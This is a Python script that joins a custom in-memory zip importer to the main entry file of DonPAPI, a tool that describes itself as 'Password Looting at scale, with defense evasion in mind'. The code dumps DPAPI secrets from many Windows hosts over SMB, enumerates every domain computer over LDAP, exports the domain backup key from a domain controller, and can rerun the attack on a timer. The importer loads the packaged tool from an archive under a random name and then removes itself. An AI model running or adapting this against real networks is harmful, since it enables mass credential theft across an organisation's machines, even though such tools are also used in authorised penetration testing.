import logging
import io
import zipfile
import random
import string
from pathlib import Path
import importlib
import importlib.machinery
import io
from pathlib import Path
import sys
import types
import zipfile
from zipfile import ZipFile, ZipInfo


### ========================================================= ###
### ====================== Custom Stuff ===================== ###
### ========================================================= ###

def _create_paths(module_name, suffixes=['py']):
    """ Returns possible paths where a module/package could be located

    Args:
        module_name (str): The name of the module to create paths for
        suffixes (list): A list of suffixes to be appended to the possible filenames

    Returns:
        list: The list of filepaths to be queried for module/package content
    """
    module_name = module_name.replace(".", "/")
    ret = []
    for suffix in suffixes:
        ret.extend([
            "%s.%s" % (module_name, suffix),
            "%s/__init__.%s" % (module_name, suffix),
        ])
    return ret

def _read_archive(content: bytes) -> ZipFile:
    """ Returns an ZipFile Archive object if available

    Args:
        content (bytes): Bytes to be parsed as archive

    Returns:
        object: zipfile.ZipFile (raises exception if `contents` could not be parsed)
    """
    content_io = io.BytesIO(content)
    return zipfile.ZipFile(content_io)


def _write_pyd_dependencies(zipname: str, archive: ZipFile) -> list[str] :
    """ Writes python specific dependencies (pyd files) included in some Python packages to disk

    Args:
        Content: Bytes to be parsed as an archive

    Returns:
        list[str]: List of pyd dependencies written on disk
    """
    pyd_deps = []
    fake_dir = Path(zipname)
    fake_dir.mkdir(parents=True, exist_ok=True)

    for i in archive.filelist:
        filename = Path(i.filename)
        if filename.suffix == ".pyd":
           archive.extract(i, path=str(fake_dir))
           print(f"[+] Found and extracted pyd file {filename} to {fake_dir / filename}")
           pyd_deps.append(fake_dir / filename)
    return pyd_deps


def _write_external_dependencies(archive: ZipFile, extensions: list[str]) -> list[str] :
    """ Finds dependencies such as DLL files included in some Python packages

    Args:
        Content: Bytes to be parsed as an archive
        Extension: Extension type to find

    Returns:
        list[str]: List of external dependencies written on disk
    """
    dependencies = []

    for i in archive.filelist:
        filename = Path(i.filename)
        for ext in extensions:
            if filename.suffix == ext:
                with open(filename.name, "wb") as f:
                    f.write(archive.read(i))
                print(f"[+] Found and extracted external dependency : {filename} to {filename.name}")
                dependencies.append(Path(filename.name))
    return dependencies


def _custom_open_archive_file(archive_obj, filepath):
    """ Opens a file located under `filepath` from an archive

    Args:
        archive_obj (object): zipfile.ZipFile
        filepath (str): The path in the archive to be extracted and returned

    Returns:
        bytes: The content of the extracted file
    """
    if isinstance(archive_obj, zipfile.ZipFile):
        return archive_obj.open(filepath, 'r').read()

    raise ValueError("Object is not a ZIP or TAR archive")


class CustomImporter(object):
    """ 
    The class that implements the Importer API. Contains the `find_module` and `load_module` methods.
    """

    def __init__(self, zipname, zipbytes, dependencies_ext=[]):
        self.zipname = zipname
        self.modules = {}
        self.archive = _read_archive(zipbytes)
        self.external_deps = _write_external_dependencies(self.archive, dependencies_ext)
        self.pyd_deps = _write_pyd_dependencies(zipname, self.archive)

    def get_dependencies(self) -> list[ZipInfo]:
        return [*self.external_deps, *self.pyd_deps]

    def find_spec(self, fullname, path, target=None):
        loader = self.find_module(fullname, path)
        if loader is not None:
            is_pkg = self.modules.get(fullname, {}).get('package', False)
            spec = importlib.machinery.ModuleSpec(fullname, loader, is_package=is_pkg)
            if is_pkg:
                spec.submodule_search_locations = [f"{self.zipname}/{fullname.replace('.', '/')}/"]
            return spec
        return None

    def find_module(self, fullname, path=None):
        """ Method that determines whether a module/package can be loaded through this Importer object. Part of Importer API

        Args:
            fullname (str): The name of the package/module to be searched.
            path (str): Part of the Importer API. Not used in this object.

        Returns:
          (object): This Importer object (`self`) if the module can be importer
            or `None` if the module is not available.
        """

        paths = _create_paths(fullname)
        for path in paths:
            try:
                content = _custom_open_archive_file(self.archive, path)
                print(f"[+] Extracted {path} from archive. The module can be loaded!")
                self.modules[fullname] = {}
                self.modules[fullname]['content'] = content
                self.modules[fullname]['filepath'] = self.zipname + '/' + path
                self.modules[fullname]['package'] = path.endswith('__init__.py')
                return self
            except KeyError as e:
                continue
        #print(f"[-] Module {fullname} cannot be loaded from {self.zipname}. Skipping...")
        # We can debug where these module are loaded from later on with LoaderTrackingPathFinder below

        # Instruct 'import' to move on to next Importer
        return None

    def create_module(self, spec):
        fullname = spec.name

        if fullname not in self.modules:
            print("[*] Module '%s' has not been attempted before. Trying to load..." % fullname)
            # Run 'find_module' and see if it is loadable through this Importer object
            if self.find_module(fullname) is not self:
                #logger.info("[-] Module '%s' has not been found as loadable. Failing..." % fullname)
                # If it is not loadable ('find_module' did not return 'self' but 'None'):
                # throw error:
                raise ImportError(
                    "Module '%s' cannot be loaded from '%s'" %
                    (fullname, self.zipname))

        mod = types.ModuleType(fullname)
        mod.__loader__ = self
        mod.__file__ = self.modules[fullname]['filepath']
        # Set module path - get filepath and keep only the path until filename
        mod.__path__ = ['/'.join(mod.__file__.split('/')[:-1]) + '/']
        mod.__url__ = self.modules[fullname]['filepath']

        mod.__package__ = fullname

        # Populate subpackage '__package__' metadata with parent package names
        pkg_name = '.'.join(fullname.split('.')[:-1])
        if len(fullname.split('.')[:-1]) > 1 and not self.modules[fullname]['package']:
            # recursively find the parent package
            while sys.modules[pkg_name].__package__ != pkg_name:
                pkg_name = '.'.join(pkg_name.split('.')[:-1])
            mod.__package__ = pkg_name
        elif not self.modules[fullname]['package']:
            mod.__package__ = pkg_name.split('.')[0]

        print(f"[*] Metadata (__package__) set to {mod.__package__} : __filepath__ to {mod.__path__},  __name__ to {mod.__name__} for {'package' if self.modules[fullname]['package'] else 'module'} {fullname}")

        self.modules[fullname]['module'] = mod
        return mod

    def exec_module(self, module):
        fullname = module.__name__
        return self._create_module(fullname)

    def _create_module(self, fullname, sys_modules=True):
        """ Method that loads module/package code into a Python Module object

        Args:
          fullname (str): The name of the module/package to be loaded
          sys_modules (bool, optional): Set to False to not inject the module into sys.modules
            It will fail for packages/modules that contain relative imports

        Returns:
          (object): Module object containing the executed code of the specified module/package

        """

        # If the module has not been found as loadable
        # through 'find_module' method (yet)
        if fullname not in self.modules:
            spec = self.find_spec(fullname, "")
            if spec is not None:
                module = self.create_module(spec)
            else:
                raise ImportError
        else:
            module = self.modules[fullname]['module']

        if sys_modules:
            sys.modules[fullname] = module

        # Execute the module/package code into the Module object
        try:
            exec(self.modules[fullname]['content'], module.__dict__)
        except BaseException as e:
            if not sys_modules:
                # This check should never be reached, we are always injecting our module into sys.modules and never removing it even if it fails. 
                print(f"[-] Module/Package {fullname} cannot be imported without adding it to sys.modules. Might contain relative imports")
            else:
                #del sys.modules[fullname]
                # We don't remove the module if the import failed. 
                # Example with deletion: 
                # impacket.dpapi depends on Cryptodome.PublicKey.RSA and if Cryptodome.PublicKey.RSA fails to import, we remove impacket.dpapi
                # But, impacket.examples.secretdump attempts to import impacket.dpapi and will fail with KeyError, because sys.modules['impacket.dpapi'] doesn't exist
                # But leaving a "broken" package in sys.modules, we can ensure that other packages that depend on it still import correctly. 
                # I have no idea what happens if the broken package is really broken. 
                pass
        return module


def remove_customimporter(zipname):
    """ Removes from the 'sys.meta_path' an CustomImporter object given its package name.

    Args:
      zipname (str): The name of the CustomImporter to remove
    """
    for importer in sys.meta_path:
        try:
            if importer.zipname == zipname:
                sys.meta_path.remove(importer)
                return True
        except AttributeError as e:
            pass
    return False


def add_remote_bytes(zipname: str, zipbytes: bytes, dependencies_ext: list[str] = []):
    """ Creates an CustomImporter object and adds it to the `sys.meta_path`.

    Args:
        zipname (str): Name of the zip file
        zipbytes (str): Zip bytes (supported: .zip)

    Returns:
      CustomImporter: The `CustomImporter` object added to the `sys.meta_path`
    """
    importer = CustomImporter(
        zipname,
        zipbytes,
        dependencies_ext
    )
    sys.meta_path.insert(0, importer)
    sys.path.insert(0, str(Path(zipname).absolute()))
    return importer


###--------------------###
### Put your code here ###
###--------------------###

zip_name = "donpapi-packages.zip"
with open(zip_name, "rb") as f:
    zipbytes = f.read()

importer = add_remote_bytes(
    zipname=''.join(random.choices(string.ascii_letters + string.digits, k=8)),
    zipbytes=zipbytes)
zipname = importer.zipname



#!/usr/bin/env python
# coding:utf-8
#
# This software is provided under under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description: Dump DPAPI secrets remotely
#
# Author:
#  PA Vandewoestyne
#  Credits :
#  Alberto Solino (@agsolino)
#  Benjamin Delpy (@gentilkiwi) for most of the DPAPI research (always greatly commented - <3 your code)
#  Alesandro Z (@) & everyone who worked on Lazagne (https://github.com/AlessandroZ/LaZagne/wiki) for the VNC & Firefox modules, and most likely for a lots of other ones in the futur.
#  dirkjanm @dirkjanm for the base code of adconnect dump (https://github.com/fox-it/adconnectdump) & every research he ever did. i learned so much on so many subjects thanks to you. <3
#  @Byt3bl3d33r for CME (lots of inspiration and code comes from CME : https://github.com/byt3bl33d3r/CrackMapExec )
#  All the Team of @LoginSecurite for their help in debugging my shity code (special thanks to @layno & @HackAndDo for that)

import argparse
import asyncio
from concurrent.futures import ThreadPoolExecutor, as_completed
import copy
import logging
import os
import sys
from rich.progress import Progress
import importlib.metadata
from time import sleep

from donpapi.lib.config import DonPAPIConfig, parse_config_file
from donpapi.lib.database import Database, create_db_engine
from donpapi.lib.paths import DPP_DB_FILE, DPP_LOG_FILE, DPP_PATH
from donpapi.core import DonPAPICore
from donpapi.lib.first_run import first_run, init_output_dir
from donpapi.lib.utils import create_recover_file, load_recover_file, parse_credentials_files, parse_targets, update_recover_file
from donpapi.lib.logger import donpapi_logger, donpapi_console

from pkgutil import iter_modules
from importlib import import_module
from typing import List, Tuple


def set_main_logger(logger , host = "\U0001F480"):
    logger.extra = {
        "host": host,
        "hostname": "",
    }

def load_collectors(root, collectors_list) -> Tuple[List, List] :
    loaded_collectors = []
    available_collectors = []
    for _, collector_name, _ in iter_modules(path=[f"{root}/collectors/"]):
        available_collectors.append(collector_name)
        if "All" in collectors_list:
            loaded_collectors.append(getattr(import_module(f"donpapi.collectors.{collector_name}"), collector_name))
        else:
            if collector_name in collectors_list:
                loaded_collectors.append(getattr(import_module(f"donpapi.collectors.{collector_name}"), collector_name))
    return available_collectors, loaded_collectors

def fetch_all_computers(options):
    from impacket.ldap import ldap, ldapasn1

    set_main_logger(donpapi_logger, options.domain)
    donpapi_logger.display(f"Collecting every hostnames from {options.domain}")
    results = None
    hostnames = []
    ldap_filter = "(objectCategory=computer)"
    attributes = [
        "name",
    ]

    dc_hostname = None
    base_dn = None

    try:
        ldap_url = f"ldap://{options.domain}"
        donpapi_logger.verbose(f"Connecting to {ldap_url} with no baseDN")
        ldap_connection = ldap.LDAPConnection(ldap_url, dstIp=options.dc_ip)
        resp = ldap_connection.search(
            scope=ldapasn1.Scope("baseObject"),
            attributes=["defaultNamingContext", "dnsHostName"],
            sizeLimit=0,
        )
        for item in resp:
            if isinstance(item, ldapasn1.SearchResultEntry) is not True:
                continue

            for attribute in item["attributes"]:
                if str(attribute["type"]) == "defaultNamingContext":
                    base_dn = str(attribute["vals"][0])
                if str(attribute["type"]) == "dnsHostName":
                    dc_hostname = str(attribute["vals"][0])
    except Exception as e:
        donpapi_logger.error(f"Exception while getting ldap info: {e}")

    try:
        ldap_url = f"ldap://{dc_hostname}"
        ldap_connection = ldap.LDAPConnection(ldap_url, base_dn, dstIp=options.dc_ip)
        if options.k or options.aesKey:
            # Kerberos connection
            ldap_connection.kerberosLogin(
                options.username if options.username is not None else "",
                options.password if options.password is not None else "",
                options.domain ,
                options.lmhash if options.lmhash is not None else "",
                options.nthash if options.nthash is not None else "",
                options.aesKey if options.aesKey is not None else "",
                useCache=options.k,
                kdcHost=options.dc_ip
            )
        else:
            # NTLM connection
            ldap_connection.login(
                options.username,
                options.password,
                options.domain,
                options.lmhash,
                options.nthash,
            )

        paged_search_control = ldapasn1.SimplePagedResultsControl(criticality=True, size=1000)

        results = ldap_connection.search(
            searchFilter=ldap_filter,
            attributes=attributes,
            searchControls=[paged_search_control],
        )  
    except Exception as e:
        donpapi_logger.error(f"Exception while requesting targets: {e}")
        import traceback
        traceback.print_exc()
    if results is None:
        donpapi_logger.error("Could not get hostnames from LDAP")
        return []
    results = [r for r in results if isinstance(r, ldapasn1.SearchResultEntry)]
    for computer in results:
        values = {str(attr["type"]).lower(): attr["vals"][0] for attr in computer["attributes"]}
        hostnames.append(f"{values['name']}.{options.domain}")
    donpapi_logger.verbose(f"Got {len(hostnames)} targets in {options.domain}")
    return hostnames

def fetch_domain_backupkey(options, db: Database):
    pvkbytes = None
    set_main_logger(donpapi_logger, options.domain)
    results = db.get_domain_backupkey(options.domain)
    if len(results) > 0:
        donpapi_logger.display(f"Loading {options.domain} domain backupkey from database...")
        pvkbytes = results[0][2]
    else:
        from dploot.lib.target import Target
        from dploot.lib.smb import DPLootSMBConnection
        from dploot.triage.backupkey import BackupkeyTriage
        try:
            dc_target = Target.create(
                domain=options.domain,
                username=options.username if options.username is not None else "",
                password=options.password,
                target=options.domain if options.domain != "" else options.dc_ip,
                lmhash=options.lmhash,
                nthash=options.nthash,
                do_kerberos=options.k,
                no_pass=True,
                aesKey=options.aesKey,
                use_kcache=options.aesKey or options.k,
            )

            dc_conn = DPLootSMBConnection(dc_target)
            dc_conn.connect()  # Connect to DC

            if dc_conn.is_admin():
                donpapi_logger.display(f"Exporting domain backup key from {dc_conn.smb_session.getServerName()}.{dc_conn.smb_session.getRemoteHost()}")
                backupkey_triage = BackupkeyTriage(target=dc_target, conn=dc_conn)
                backupkey = backupkey_triage.triage_backupkey()
                pvkbytes = backupkey.backupkey_v2
                db.add_domain_backupkey(options.domain, pvkbytes)
                donpapi_logger.display(f"Successfully dumped domain backup key from {dc_conn.smb_session.getServerName()}.{dc_conn.smb_session.getRemoteHost()}")
            else:
                donpapi_logger.error("Insufficient privileges: could not export domain backup key")
        except Exception as e:
            donpapi_logger.error(f"Could not get domain backupkey: {e}")
    donpapi_logger.extra = None
    set_main_logger(donpapi_logger)
    return pvkbytes

def main():
    root = os.path.dirname(os.path.realpath(__file__))
    #version = importlib.metadata.version("donpapi")
    parser = argparse.ArgumentParser(add_help = True, description = f"Password Looting at scale, with defense evasion in mind.\nVersion: !PATCHED OUT!")

    parser.add_argument("-v", action="count", default=0, help="Verbosity level (-v or -vv)")
    parser.add_argument('-o', '--output-directory', action="store", metavar="DIRNAME", help='Output directory. Default is ~/.donpapi/loot/')

    subparsers = parser.add_subparsers(help="DonPAPI Action", dest="action", required=True)
    collect_subparser = subparsers.add_parser("collect", help="Dump secrets on a target list")
    collect_subparser.add_argument("--keep-collecting", type=int, action="store", metavar="seconds",  help="Rerun the attack against all targets after X seconds, X being the value")
    collect_subparser.add_argument("--threads", default=50, type=int, metavar="Number of threads",  help="Number of threads (default: 50)")
    collect_subparser.add_argument('--no-config', action="store_true", help="Do not load donpapi config file (~/.donpapi/donpapi.conf)")

    group_authent = collect_subparser.add_argument_group("authentication")

    group_authent.add_argument("-t", "--target", nargs="+", type=str, help="the target IP(s), range(s), CIDR(s), hostname(s), FQDN(s), file(s) containing a list of targets, ALL to fetch every computer hostnames from LDAP")
    group_authent.add_argument("-d", "--domain", metavar="domain.local", dest="domain", action="store", help="Domain")
    group_authent.add_argument("-u", "--username", metavar="username", dest="username", action="store", help="Username")
    group_authent.add_argument("-p", "--password", metavar="password", dest="password", action="store", help="Password")
    group_authent.add_argument("-H","--hashes", metavar="LMHASH:NTHASH", dest="hashes", action="store", help="NTLM hashes, format is LMHASH:NTHASH")
    group_authent.add_argument("--no-pass", action="store_true", help="don\'t ask for password (useful for -k)")
    group_authent.add_argument("-k", action="store_true", help="Use Kerberos authentication. Grabs credentials from ccache file "
                                                       "(KRB5CCNAME) based on target parameters. If valid credentials "
                                                       "cannot be found, it will use the ones specified in the command line")
    group_authent.add_argument("--aesKey", action="store", metavar = "hex key", help="AES key to use for Kerberos Authentication (1128 or 256 bits)")
    group_authent.add_argument("--laps", action="store", metavar = "Administrator", help="use LAPS to request local admin password. The laps parameter value is the local admin account use to connect", default=False)
    group_authent.add_argument("--dc-ip", action="store", metavar="IP address",  help="IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter")
    group_authent.add_argument("-r", "--recover-file", metavar="/home/user/.donpapi/recover/recover_1718281433", type=str, help="The recover file path. If used, the other parameters will be ignored")

    group_attacks = collect_subparser.add_argument_group('attacks')
    group_attacks.add_argument('-c','--collectors', action="store", default="All",  help= ", ".join(load_collectors(root, [])[0])+", All (all previous) (default: All). Possible to chain multiple collectors comma separated")
    group_attacks.add_argument("-nr","--no-remoteops", action="store_true", help="Disable Remote Ops operations (basically no Remote Registry operations, no DPAPI System Credentials)")
    group_attacks.add_argument("--fetch-pvk", action="store_true", help=("Will automatically use domain backup key from database, and if not already dumped, will dump it on a domain controller"))
    group_attacks.add_argument("--pvkfile", action="store", help=("Pvk file with domain backup key"))
    group_attacks.add_argument("--pwdfile", action="store", help=("File containing username:password that will be used eventually to decrypt masterkeys"))
    group_attacks.add_argument("--ntfile",action="store",help=("File containing username:nthash that will be used eventually to decrypt masterkeys"))
    group_attacks.add_argument("--mkfile", action="store", help=("File containing {GUID}:SHA1 masterkeys mappings"))

    gui_subparser = subparsers.add_parser("gui", help="Spawn a Flask webserver to crawl DonPAPI database")
    gui_subparser.add_argument('--bind', type=str, action='store', help='HTTP Server bind address (default=127.0.0.1)', default="127.0.0.1")
    gui_subparser.add_argument('--port', type=int, action='store', help='HTTP Server port (default=8088)', default=8088)
    gui_subparser.add_argument('--ssl', action='store_true', help='Use an encrypted connection')
    gui_subparser.add_argument('--basic-auth', action='store', metavar="user:password", help='Set up a basic auth')


    set_main_logger(donpapi_logger)

    # Stores the list of false positives usernames:
    false_positivee = [
        ".", 
        "..", 
        "desktop.ini", 
        "Public", 
        "Default", 
        "Default User", 
        "All Users", 
        ".NET v4.5", 
        ".NET v4.5 Classic"
    ]
    # Stores the maximum filesize 
    max_filesize = 5000000

    # Parse args
    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)
    
    options = parser.parse_args()
    
    # Init Logger
    if options.v == 1:
        donpapi_logger.logger.setLevel(logging.INFO)
    elif options.v >= 2:
        donpapi_logger.logger.setLevel(logging.DEBUG)
    else:
        donpapi_logger.logger.setLevel(logging.ERROR)

    # Is it the first time you launch Donpapi?
    first_run()

    # Using custom folder ?
    output_dir = DPP_PATH
    if options.output_directory is not None:
        output_dir = os.path.expanduser(options.output_directory)

    init_output_dir(output_dir)

    donpapi_logger.add_file_log(os.path.join(output_dir, DPP_LOG_FILE))
    donpapi_logger.display(f"DonPAPI Version {version}") 
    donpapi_logger.display(f"Output directory at {output_dir}")

    # Load DB
    db_engine = create_db_engine(os.path.join(output_dir,DPP_DB_FILE))
    db = Database(db_engine)

    if options.action == "collect":

        # Handle recover file
        current_target_recovered = []

        if options.recover_file is not None:
            donpapi_logger.display(f"Using recover file {options.recover_file}")

            options_recovered, target_recovered = load_recover_file(recover_file_path=options.recover_file)
            options = argparse.Namespace(**options_recovered)
            current_target_recovered = target_recovered

        # Handle account
        if options.domain is None:
            options.domain = ''

        if (options.password == "" or options.password is None) and (options.username != "" and options.username is not None) and options.hashes is None and options.no_pass is False and options.aesKey is None:
            from getpass import getpass
            options.password = getpass("Password:")

        if options.aesKey is not None:
            options.k = True
        if options.hashes is not None:
            if ':' in options.hashes:
                options.lmhash, options.nthash = options.hashes.split(':')
            else:
                options.lmhash = 'aad3b435b51404eeaad3b435b51404ee'
                options.nthash = options.hashes
        else:
            options.lmhash = ''
            options.nthash = ''

        # Load files to decrypt maskerkeys
        pvkbytes, passwords, nthashes, masterkeys = parse_credentials_files(
            pvkfile=options.pvkfile,
            passwords_file=options.pwdfile,
            nthashes_file=options.ntfile,
            masterkeys_file=options.mkfile,
            username=options.username,
            password=options.password,
            nthash=options.nthash)

        # Need to download Domain Backup Key?
        if options.fetch_pvk:
            if options.domain == "" or options.dc_ip is None:
                donpapi_logger.error("--domain and --dc-ip is required with -fetch-pvk")
                return
            pvkbytes = fetch_domain_backupkey(options, db)

        # Handling collectors
        _, collectors = load_collectors(root, options.collectors.split(","))

        # Target selection
        targets = []
        if hasattr(options, "target") and options.target:
            for target in options.target:
                if target == "ALL":
                    # Target every computers from domain
                    if hasattr(options, "domain") and options.domain != "":
                        targets.extend(fetch_all_computers(options))
                    else:
                        donpapi_logger.error("--domain required with --target ALL")
                        return
                else:
                    if os.path.exists(target) and os.path.isfile(target):
                        with open(target) as target_file:
                            for target_entry in target_file:
                                targets.extend(parse_targets(target_entry.strip()))
                    else:
                        targets.extend(parse_targets(target))

        if len(targets) <= 0:
            donpapi_logger.error("No target loaded. Exiting.")
            return
        else:
            donpapi_logger.display("Loaded {i} targets".format(i=len(targets)))
            donpapi_logger.debug(f"Targets :{targets}")

        # Parse config file ?
        donpapi_config = DonPAPIConfig()
        if not options.no_config:
            donpapi_config = parse_config_file()

        # Let's rock
        try:
            asyncio.run(start_dpp(
                options, 
                db, 
                targets, 
                current_target_recovered, 
                collectors,
                pvkbytes, 
                passwords, 
                nthashes, 
                masterkeys, 
                donpapi_config, 
                false_positivee,
                max_filesize,
                output_dir
                )
            )
        except Exception as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            donpapi_logger.error(str(e))
        finally:
            db_engine.dispose()
    elif options.action == "gui":
        donpapi_logger.display("Initiating DonPAPI GUI")
        from donpapi.server import start_gui
        start_gui(
            options=options,
            db_engine=db_engine,
            db=db
        )
    else:
        donpapi_logger.error(f"Unknown action {options.action}")

async def start_dpp(options, db, targets, current_target_recovered, collectors, pvkbytes, passwords, nthashes, masterkeys, donpapi_config, false_positive, max_size, output_dir):
    with ThreadPoolExecutor(max_workers=options.threads) as executor, Progress(console=donpapi_console) as progress:
        task = progress.add_task(f"[red][bold]DonPAPI running against {len(targets)} targets", total=len(targets))
        if len(current_target_recovered) > 0:
            progress.update(task, completed=len(targets)-len(current_target_recovered))
        if options.keep_collecting:
            while 1:
                targets_for_round = copy.deepcopy(targets)
                create_dpp_thread(options, db, targets_for_round, current_target_recovered, collectors, pvkbytes, passwords, nthashes, masterkeys, donpapi_config, output_dir, progress, task, executor)
                donpapi_logger.verbose(f"DonPAPI finished for {len(targets)} targets. Sleeping {options.keep_collecting} seconds now before rerunning the attack")
                sleep(options.keep_collecting)
        else:
            create_dpp_thread(options, db, targets, current_target_recovered, collectors, pvkbytes, passwords, nthashes, masterkeys, donpapi_config, false_positive, max_size, output_dir, progress, task, executor)
            donpapi_logger.verbose(f"DonPAPI finished for {len(targets)} targets.")
        

def create_dpp_thread(options, db, targets, current_target_recovered, collectors, pvkbytes, passwords, nthashes, masterkeys, donpapi_config, false_positive, max_size, output_dir, progress_bar, task, executor):
    # Recover file
    progress_bar.update(task, completed=0 if len(current_target_recovered) == 0 else len(targets) - len(current_target_recovered))
    current_targets = copy.deepcopy(targets)
    if len(current_target_recovered) > 0:
        # finishing targets
        current_targets = current_target_recovered
    recover_filename = create_recover_file(targets=targets, dirpath=output_dir, options=options)
    donpapi_logger.display(f"Recover file available at {recover_filename}")
    try:
        with open(recover_filename,"r+") as recover_file_handle:
            future = [executor.submit(core_run,(options, db, target, collectors, pvkbytes, passwords, nthashes, masterkeys, donpapi_config, false_positive, max_size, output_dir)) for target in targets]
            for i in as_completed(future):
                target_finished = i.result()
                current_targets.remove(target_finished)
                update_recover_file(recover_file_handle, current_targets)
                progress_bar.update(task, advance=1)
    except KeyboardInterrupt:
            donpapi_logger.error("Caugth Keyboard Interrupt. Gracefully shutdown")
            [thread.cancel() for thread in future]
            executor.shutdown(wait=True)
    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback
            traceback.print_exc()
        donpapi_logger.error(str(e))

def core_run(datas):
    options, db, target, collectors, pvkbytes, passwords, nthashes, masterkeys, donpapi_config, false_positive, max_size, output_dir = datas
    donpapi_logger.debug(f"SeatBelt thread for {target} started")
    try:
        _ = DonPAPICore(options, db, target, collectors, pvkbytes, passwords, nthashes, masterkeys, donpapi_config, false_positive, max_size, output_dir)
    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback
            traceback.print_exc()
        donpapi_logger.error(str(e))
    return target

if __name__ == "__main__":
    main()



###---------###
### Cleanup ###
###---------###

written_deps = importer.get_dependencies()
print(f"[!] If needed, remove the dependencies that were written to disk:\n{written_deps}")
remove_customimporter(zipname)
